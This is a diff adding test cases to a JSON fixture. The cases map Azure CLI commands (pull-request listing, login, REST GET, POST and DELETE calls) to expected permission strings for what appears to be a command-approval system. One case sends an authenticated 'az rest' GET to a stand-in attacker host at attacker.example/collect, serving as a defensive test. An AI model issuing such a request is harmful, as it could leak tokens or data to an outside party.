@@ -153,5 +153,168 @@
     ],
     "expected": null,
     "note": "Unknown commands never match."
+  },
+  {
+    "argv": [
+      "repos",
+      "pr",
+      "list",
+      "--org",
+      "https://dev.azure.com/own",
+      "--project",
+      "own-project",
+      "--repository",
+      "own-repository",
+      "--status",
+      "active",
+      "--top",
+      "100",
+      "--output",
+      "json"
+    ],
+    "expected": {
+      "operation_id": "repos.pr.list",
+      "permission": "az.organization[url=https://dev.azure.com/own].project[name=own-project].repo[name=own-repository].pull-request[*]#list",
+      "display": "List pull requests for repository own-repository in project own-project",
+      "exact_command": false
+    }
+  },
+  {
+    "argv": [
+      "login",
+      "--use-device-code",
+      "--allow-no-subscriptions"
+    ],
+    "expected": {
+      "operation_id": "login.device-code",
+      "permission": "az.account[*]#login",
+      "display": "Sign in to Azure with a device code",
+      "exact_command": true
+    }
+  },
+  {
+    "argv": [
+      "version"
+    ],
+    "expected": {
+      "operation_id": "version",
+      "permission": "az.runtime[*]#read",
+      "display": "Show Azure CLI and extension versions",
+      "exact_command": false
+    }
+  },
+  {
+    "argv": [
+      "account",
+      "show"
+    ],
+    "expected": {
+      "operation_id": "account.show",
+      "permission": "az.account[*]#read",
+      "display": "Show the signed-in Azure account",
+      "exact_command": false
+    }
+  },
+  {
+    "argv": [
+      "rest",
+      "--method",
+      "GET",
+      "--resource",
+      "own-audience",
+      "--url",
+      "https://dev.azure.com/own/_apis/git/repositories",
+      "--output",
+      "json",
+      "--only-show-errors"
+    ],
+    "expected": {
+      "operation_id": "rest.get",
+      "permission": "az.http[method=GET].audience[id=own-audience].endpoint[url=https://dev.azure.com/own/_apis/git/repositories]#read",
+      "display": "Azure REST GET https://dev.azure.com/own/_apis/git/repositories with audience own-audience",
+      "exact_command": false
+    }
+  },
+  {
+    "argv": [
+      "rest",
+      "--method",
+      "POST",
+      "--resource",
+      "own-audience",
+      "--url",
+      "https://dev.azure.com/own/_apis/Contribution/HierarchyQuery",
+      "--body",
+      "{\"contributionIds\":[]}",
+      "--output",
+      "json",
+      "--only-show-errors"
+    ],
+    "expected": {
+      "operation_id": "rest.post",
+      "permission": "az.http[method=POST].audience[id=own-audience].endpoint[url=https://dev.azure.com/own/_apis/Contribution/HierarchyQuery]#request",
+      "display": "Azure REST POST to https://dev.azure.com/own/_apis/Contribution/HierarchyQuery with audience own-audience",
+      "exact_command": false
+    }
+  },
+  {
+    "argv": [
+      "rest",
+      "--method",
+      "DELETE",
+      "--resource",
+      "own-audience",
+      "--url",
+      "https://dev.azure.com/own/_apis/git/repositories"
+    ],
+    "expected": null
+  },
+  {
+    "argv": [
+      "rest",
+      "--method",
+      "GET",
+      "--resource",
+      "own-audience",
+      "--url",
+      "https://dev.azure.com/own/x",
+      "--output-file",
+      "/tmp/x"
+    ],
+    "expected": null
+  },
+  {
+    "argv": [
+      "rest",
+      "--method",
+      "GET",
+      "--resource",
+      "own-audience",
+      "--url",
+      "https://attacker.example/collect"
+    ],
+    "expected": {
+      "operation_id": "rest.get",
+      "permission": "az.http[method=GET].audience[id=own-audience].endpoint[url=https://attacker.example/collect]#read",
+      "display": "Azure REST GET https://attacker.example/collect with audience own-audience",
+      "exact_command": false
+    }
+  },
+  {
+    "argv": [
+      "rest",
+      "--method",
+      "GET",
+      "--resource",
+      "own-audience",
+      "--url",
+      "https://dev.azure.com/own/_apis/policy/evaluations?artifactId=x"
+    ],
+    "expected": {
+      "operation_id": "rest.get",
+      "permission": "az.http[method=GET].audience[id=own-audience].endpoint[url=https://dev.azure.com/own/_apis/policy/evaluations?artifactId=x]#read",
+      "display": "Azure REST GET https://dev.azure.com/own/_apis/policy/evaluations?artifactId=x with audience own-audience",
+      "exact_command": false
+    }
   }
 ]
